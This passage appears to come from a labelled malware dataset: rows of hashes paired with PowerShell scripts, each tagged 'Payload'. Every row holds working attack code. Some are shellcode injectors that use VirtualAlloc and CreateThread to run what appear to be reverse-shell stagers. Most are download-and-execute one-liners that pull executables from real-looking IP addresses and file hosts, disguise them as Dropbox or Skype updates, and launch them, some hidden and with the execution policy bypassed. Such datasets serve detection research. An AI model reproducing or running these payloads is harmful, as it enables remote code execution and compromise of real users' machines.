x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
fed72bcf1a223ed5754756817a4ca5a21de504e9c05cba4373a98716a7f823b2,"
(New-Object System.Net.WebClient).DownloadFile('https://www.dropbox.com/s/gx6kxkfi7ky2j6f/Dropbox.exe?dl=1',""$env:TEMP\DropboxUpdate.exe"");Start-Process (""$env:TEMP\DropboxUpdate.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
8eec39c06c40b0a2ed60b1dcd1155c4556e66a20e2bdfd683b0076b9456e05af,"
$19bX = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $19bX -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd5,0xba,0xc8,0xc2,0x0a,0x98,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x14,0x03,0x56,0xdc,0x20,0xff,0x64,0x34,0x26,0x00,0x95,0xc4,0x47,0x88,0x70,0xf5,0x47,0xee,0xf1,0xa5,0x77,0x64,0x57,0x49,0xf3,0x28,0x4c,0xda,0x71,0xe5,0x63,0x6b,0x3f,0xd3,0x4a,0x6c,0x6c,0x27,0xcc,0xee,0x6f,0x74,0x2e,0xcf,0xbf,0x89,0x2f,0x08,0xdd,0x60,0x7d,0xc1,0xa9,0xd7,0x92,0x66,0xe7,0xeb,0x19,0x34,0xe9,0x6b,0xfd,0x8c,0x08,0x5d,0x50,0x87,0x52,0x7d,0x52,0x44,0xef,0x34,0x4c,0x89,0xca,0x8f,0xe7,0x79,0xa0,0x11,0x2e,0xb0,0x49,0xbd,0x0f,0x7d,0xb8,0xbf,0x48,0xb9,0x23,0xca,0xa0,0xba,0xde,0xcd,0x76,0xc1,0x04,0x5b,0x6d,0x61,0xce,0xfb,0x49,0x90,0x03,0x9d,0x1a,0x9e,0xe8,0xe9,0x45,0x82,0xef,0x3e,0xfe,0xbe,0x64,0xc1,0xd1,0x37,0x3e,0xe6,0xf5,0x1c,0xe4,0x87,0xac,0xf8,0x4b,0xb7,0xaf,0xa3,0x34,0x1d,0xbb,0x49,0x20,0x2c,0xe6,0x05,0x85,0x1d,0x19,0xd5,0x81,0x16,0x6a,0xe7,0x0e,0x8d,0xe4,0x4b,0xc6,0x0b,0xf2,0xac,0xfd,0xec,0x6c,0x53,0xfe,0x0c,0xa4,0x97,0xaa,0x5c,0xde,0x3e,0xd3,0x36,0x1e,0xbf,0x06,0xa2,0x1b,0x57,0x69,0x9b,0x25,0xc0,0x01,0xde,0x25,0x0f,0x69,0x57,0xc3,0x5f,0xdd,0x38,0x5c,0x1f,0x8d,0xf8,0x0c,0xf7,0xc7,0xf6,0x73,0xe7,0xe7,0xdc,0x1b,0x8d,0x07,0x89,0x74,0x39,0xb1,0x90,0x0f,0xd8,0x3e,0x0f,0x6a,0xda,0xb5,0xbc,0x8a,0x94,0x3d,0xc8,0x98,0x40,0xce,0x87,0xc3,0xc6,0xd1,0x3d,0x69,0xe6,0x47,0xba,0x38,0xb1,0xff,0xc0,0x1d,0xf5,0x5f,0x3a,0x48,0x8e,0x56,0xae,0x33,0xf8,0x96,0x3e,0xb4,0xf8,0xc0,0x54,0xb4,0x90,0xb4,0x0c,0xe7,0x85,0xba,0x98,0x9b,0x16,0x2f,0x23,0xca,0xcb,0xf8,0x4b,0xf0,0x32,0xce,0xd3,0x0b,0x11,0xce,0x28,0xda,0x5f,0xa4,0x40,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$JQEo=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($JQEo.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$JQEo,0,0,0);for (;;){Start-sleep 60};

",Payload
2061d98b6bb4f490a28cddec9454ee80bafe0a669fde6c44a8ae3262e3d0fb19,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
60d7a22d2d7d01dbe177869e132609812d6efb46e61606a9d4e38cd2074ec58c,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/wopkwj.exe',""$env:TEMP\skypeupdate.exe"");Start-Process (""$env:TEMP\skypeupdate.exe"")

",Payload
e7aca1af6f5f14fed5adc581ad80c9f383fadf559cc9d849954ed02d7afe103f,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x1a,0x68,0x02,0x00,0x02,0x2b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
1e5b430c72c32ae100fdf5f368001d04c0e54e4b026fe992ca4635e461254c32,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x80,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
9c326827d1336c96bd378e27aaa913e21ad726562556ac000a120a5e45646033,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.166.140/~zebra/iesecv.exe',""$env:APPDATA\scvkem.exe"");Start-Process (""$env:APPDATA\scvkem.exe"")

",Payload
34b22f0791ed96d3f6a23703d5b08fa75cf94b57851d1319168b4dad84abf234,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe',$env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
f150c926cfe5a29f0275f5e2736da8ce9eb5dacd9675fc7966611d6befe64ee7,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )

",Payload
9c326827d1336c96bd378e27aaa913e21ad726562556ac000a120a5e45646033,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.166.140/~zebra/iesecv.exe',""$env:APPDATA\scvkem.exe"");Start-Process (""$env:APPDATA\scvkem.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
f150c926cfe5a29f0275f5e2736da8ce9eb5dacd9675fc7966611d6befe64ee7,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
0b4fd4d7f86727d7299d142ab5c1cb5f47cba5a8a3b4f111c4231a3ebaf65783,"
(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9507148/Patload.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
aca417326cb3579dbdda93cd9b047a7712ad88e0897dfb8ee56d87815af1c871,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x69,0x43,0xda,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
568ca9d254f1b27f7b3b9add0ecc9933efb99158852afa860cb98733fe7be5c6,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x69,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
f6b500b04947da749d732da7d839766339aa83ee7706afe0527881482548e3ee,"
